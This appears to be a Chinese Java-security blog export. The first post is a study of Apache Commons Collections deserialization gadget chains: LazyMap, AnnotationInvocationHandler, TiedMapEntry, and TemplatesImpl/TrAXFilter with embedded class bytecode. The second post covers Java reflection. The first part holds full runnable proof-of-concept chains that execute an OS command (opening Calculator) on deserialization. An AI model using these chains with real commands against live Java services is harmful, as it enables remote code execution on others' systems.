测试以下代码可以成功弹计算机。 123456789101112131415161718192021import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;/** * author: f19t * Date: 2023/2/25 16:39 */public class Test_ChainedTransformer &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; //定义一个命令执行的transformers数组 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(null); &#125;&#125; LazyMapLazyMap的decorate()方法接收两个参数，(Map map, Transformer factory)。 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; 并且当map.containsKey(key)&#x3D;&#x3D;null时，其get方法会调用factory.transform(key)方法。 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125; &#125; InvocationHandler动态代理实现接口的类，如果使用动态代理，执行任意方法都会执行动态代理的invoke方法。 12public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; AnnotationInvocationHandlerAnnotationInvocationHandler是一个动态代理程序，其有两个参数，Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2,一个参数是集成Annotation的类，另一个是Map对象。 12345678class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; this.memberValues = var2; &#125; public Object invoke(Object var1, Method var2, Object[] var3) &#123; Object var6 = this.memberValues.get(var4);//关键代码 &#125;&#125; 测试代码，执行任意命令都可弹计算器。 1234567891011121314151617181920212223242526272829303132333435363738394041import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.annotation.Annotation;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 17:06 */public class Test_AnnotationInvocationHandler &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain);// outerMap.get(&quot;1&quot;); Class c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = c1.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);//参数一，只要继承Annotation的类都可以 Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] &#123;Map.class&#125;, handler); proxyMap.clear();//执行任意命令都可弹计算器 &#125;&#125; 反序列化demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.lang.annotation.Annotation;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;import java.io.*;/** * author: f19t * Date: 2023/2/25 17:06 */public class Test_AnnotationInvocationHandler &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain);// outerMap.get(&quot;1&quot;); Class c1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor construct = c1.getDeclaredConstructor(Class.class,Map.class); construct.setAccessible(true); InvocationHandler handler=(InvocationHandler) construct.newInstance(Target.class, outerMap);//参数一，只要继承Annotation的类都可以 Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] &#123;Map.class&#125;, handler);// proxyMap.clear();//执行任意命令都可弹计算器 handler = (InvocationHandler) construct.newInstance(Target.class, proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 注意，反序列化时，高版本AnnotationInvocationHandler的LazyMap，变成了LinkedHashMap，所以上面POC无法在高版本命令执行。 TiedMapEntry其hashCode方法调用getValue方法，getValue方法里面有存在map.get方法。 1234567public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;public Object getValue() &#123; return this.map.get(this.key); &#125; 以下测试代码弹计算机 123456789101112131415161718192021222324252627import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 18:09 */public class Test_TiedMapEntry &#123; public static void main(String[] args) &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap=new HashMap(); Map outerMap= LazyMap.decorate(innerMap,transformerChain); TiedMapEntry tt=new TiedMapEntry(outerMap,&quot;tt&quot;); tt.hashCode(); &#125;&#125; 反序列化测试代码，注意：回弹两遍计算机，因为hashmap的readObject的putVal会调用hash方法，里面调用了hashcode，进而调用get，触发了命令执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;/** * author: f19t * Date: 2023/2/25 18:09 */public class Test_TiedMapEntry &#123; public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123; Transformer[] fake = new Transformer[]&#123;new ConstantTransformer(1)&#125;; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer transformerChain = new ChainedTransformer(fake); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tt = new TiedMapEntry(outerMap, &quot;tt&quot;); Map expMap = new HashMap(); expMap.put(tt, &quot;yy&quot;); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(transformerChain, transformers); outerMap.clear(); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); &#125;&#125; TrAXFilterTrAXFilter会执行传入的templates的newTransformer方法。 123public TrAXFilter(Templates templates) throws TransformerConfigurationException_transformer = (TransformerImpl) templates.newTransformer(); 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/25 19:03 */public class Test_TrAXFilter &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); TrAXFilter trAXFilter = new TrAXFilter(obj); &#125;&#125; HelloTemplatesImpl的代码 123456789101112131415161718192021import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public classHelloTemplatesImpl extends AbstractTranslet &#123; public void transform(DOM document, SerializationHandler[] handlers)throws TransletException &#123;&#125; public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) throws TransletException &#123;&#125; public HelloTemplatesImpl() throws Exception &#123; super(); Process p = Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); System.out.println(&quot;Hello TemplatesImpl&quot;); &#125;&#125; InstantiateTransformerInstantiateTransformer的transform方法会执行传入类的构造函数。 12345678public Object transform(Object input) &#123; try &#123; if (!(input instanceof Class)) &#123; throw new FunctorException(&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); &#125; else &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; 测试代码 123456789101112131415import org.apache.commons.collections.functors.InstantiateTransformer;import javax.xml.transform.TransformerConfigurationException;/** * author: f19t * Date: 2023/2/25 18:53 */public class Test_InstantiateTransformer &#123; public static void main(String[] args) throws TransformerConfigurationException &#123; InstantiateTransformer transformers = new InstantiateTransformer(null,null); transformers.transform(hello.class); &#125;&#125; hello代码 123456public class hello &#123; static &#123; System.out.println(&quot;hello&quot;); &#125; &#125; 有了InstantiateTransformer和TrAXFilter可以进行组合，进行执行字节码。简要代码 123Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;obj&#125;)&#125;;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"Java反射","slug":"Java反射","date":"2023-02-19T11:58:26.000Z","updated":"2023-02-19T12:33:59.603Z","comments":true,"path":"2023/02/19/Java反射/","link":"","permalink":"https://f19t.github.io.git/2023/02/19/Java%E5%8F%8D%E5%B0%84/","excerpt":"java反射之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。","text":"java反射之前学过反射，半知半解，今天重新学习一下Java反射机制，以及能做的事情。 下面是反射获取类Test的的源码： 1234567891011121314151617181920212223242526272829import java.io.IOException;import java.lang.Runtime;public class Test &#123; public static final int h = 5;//字段1，直接赋值 public String s = &quot;test&quot;;//字段2 public static final boolean b =new Boolean(false);//字段3，间接赋值 public Test() &#123; //构造函数1 System.out.println(&quot;无参构造函数&quot;); &#125; public Test(int m, double n) throws IOException &#123;//有参构造函数2 System.out.println(&quot;有参构造函数&quot;); System.out.println(&quot;获取到int=&quot;+m); System.out.println(&quot;获取到double=&quot;+n); Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); &#125; public String hello(String s) &#123; //方法1 System.out.println(&quot;调用hello&quot;); return &quot;Hello World~&quot;; &#125; public int hello2(int x,double y) throws IOException &#123; //方法2 System.out.println(&quot;获取到int=&quot;+x); System.out.println(&quot;获取到double=&quot;+y); Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); return 3; &#125;&#125; 反射创建对象实例12345678910111213141516171819202122232425import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/18 21:44 */public class Test_Reflect_getConstructor &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123; Class c = Class.forName(&quot;Test&quot;); Constructor ct1 = c.getConstructor();//不会初始化，无参构造 Test obj = (Test)ct1.newInstance();//初始化执行 obj.hello(&quot;test&quot;); Class partypes[] = new Class[2]; partypes[0] = Integer.TYPE; partypes[1] = Double.TYPE; Constructor ct2 = c.getConstructor(partypes);//不会初始化，有参构造 Object arglist[] = new Object[2]; arglist[0] = new Integer(37); arglist[1] = new Double(47.0); Object obj2 = ct2.newInstance(arglist);//有参生成对象 &#125;&#125; 反射获取类方法123456789101112131415161718192021222324import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 19:12 */public class Test_Reflect_methods &#123;public static void main(String[]args) throws ClassNotFoundException &#123; Class c = Class.forName(&quot;java.lang.Runtime&quot;);//获取类 Method methods[] = c.getDeclaredMethods();//获取所有方法 for (int i = 0; i &lt; methods.length; i++) &#123; Method m = methods[i]; Class pvec[] =m.getParameterTypes();// System.out.println(&quot;类名=&quot; +m.getDeclaringClass());//获取类名 System.out.println(&quot;方法=&quot;+m.getName());//获取方法名 for (int q = 0; q &lt; pvec.length; q++) &#123; System.out.println(&quot;参数类型&quot;+pvec[q].getName()); //获取方法参数 &#125; System.out.println(&quot;返回类型=&quot;+m.getReturnType());//获取返回类型 System.out.println(&quot;-----------------------------&quot;); &#125;&#125;&#125; 获取字段123456789101112131415161718192021222324import java.lang.reflect.Field;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/2/18 20:43 */public class Test_Reflect_field &#123; public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException &#123; Class c = Class.forName(&quot;Test&quot;); Field fieldlist[] = c.getDeclaredFields(); for (int i = 0; i &lt; fieldlist.length; i++) &#123; fieldlist[i].setAccessible(true); System.out.println(&quot;字段名=&quot;+fieldlist[i].getName()); System.out.println(&quot;字段值=&quot;+fieldlist[i].get(c.newInstance()));//get方法需要传入实例对象 System.out.println(&quot;字段类型=&quot;+fieldlist[i].getType()); int mod = fieldlist[i].getModifiers(); System.out.println(&quot;声明类型=&quot;+ Modifier.toString(mod)); System.out.println(&quot;----------------------------&quot;); &#125; &#125;&#125; 运行结果 12345678910111213141516171819字段名=h无参构造函数字段值=5字段类型=int声明类型=public static final----------------------------字段名=s无参构造函数字段值=test字段类型=class java.lang.String声明类型=public----------------------------字段名=b无参构造函数字段值=false字段类型=boolean声明类型=public static final---------------------------- 修改字段反射修改注意如果是static final修饰的，需要先去掉final，再次进行修改，还需要注意，static final修饰的直接赋值还是间接赋值，直接赋值只能通过反射获取修改后的数据（编译优化导致）。间接赋值的可以直接获取修改后的数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Modifier;/** * author: f19t * Date: 2023/2/18 22:03 */public class Test_Reflect_Set_field &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException, IOException &#123; Class c = Class.forName(&quot;Test&quot;); Field field[] = c.getDeclaredFields(); Test obj = (Test) c.newInstance(); for (int i = 0; i &lt; field.length; i++) &#123; System.out.println(&quot;修改前的值&quot;+field[i].getName()+&quot;=&quot;+field[i].get(obj)+&quot; 类型为 &quot;+Modifier.toString(field[i].getModifiers())); &#125; System.out.println(&quot;------------------&quot;); field[0].setAccessible(true); Field modifiers = field[0].getClass().getDeclaredField(&quot;modifiers&quot;); modifiers.setAccessible(true); modifiers.setInt(field[0], field[0].getModifiers() &amp; ~Modifier.FINAL); field[0].set(obj, 10); System.out.println(&quot;反射修改后直接获取&quot;+field[0].getName()+&quot;=&quot;+obj.h); System.out.println(&quot;反射修改后反射获取&quot;+field[0].getName()+&quot;=&quot;+field[0].get(obj)); System.out.println(&quot;--------------------&quot;); field[1].setAccessible(true); modifiers.setInt(field[1], field[1].getModifiers() &amp; ~Modifier.FINAL); field[1].set(obj, &quot;hack&quot;); System.out.println(&quot;反射修改后直接获取&quot;+field[1].getName()+&quot;=&quot;+obj.s); System.out.println(&quot;反射修改后反射获取&quot;+field[1].getName()+&quot;=&quot;+field[1].get(obj)); System.out.println(&quot;--------------------&quot;); field[2].setAccessible(true); modifiers.setInt(field[2], field[2].getModifiers() &amp; ~Modifier.FINAL); field[2].set(obj, true); System.out.println(&quot;反射修改后直接获取&quot;+field[2].getName()+&quot;=&quot;+obj.b); System.out.println(&quot;反射修改后反射获取&quot;+field[2].getName()+&quot;=&quot;+field[2].get(obj)); &#125;&#125; 运行结果： 12345678910111213无参构造函数修改前的值h=5 类型为 public static final修改前的值s=test 类型为 public修改前的值b=false 类型为 public static final------------------反射修改后直接获取h=5反射修改后反射获取h=10--------------------反射修改后直接获取s=hack反射修改后反射获取s=hack--------------------反射修改后直接获取b=true反射修改后反射获取b=true 调用方法常规类调用方法常规类调用方法流程为获取类、创建实例、执行方法 1234567891011121314151617181920212223import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;/** * author: f19t * Date: 2023/2/18 21:22 */public class Test_Reflect_Get_methods &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123; Class c = Class.forName(&quot;Test&quot;); Class partypes[] = new Class[2]; partypes[0] = Integer.TYPE; partypes[1] = Double.TYPE; Method meth = c.getMethod(&quot;hello2&quot;, partypes); Test test = new Test(); Object arglist[] = new Object[2]; arglist[0] = new Integer(3); arglist[1] = new Double(3.1); Object ref = meth.invoke(test, arglist); System.out.println(ref); &#125;&#125; 单例类调用方法单例模式的特点 单例类只能有一个实例。 单例类必须自己创建自己的唯一实例。 单例类必须给所有其他对象提供这一实例。 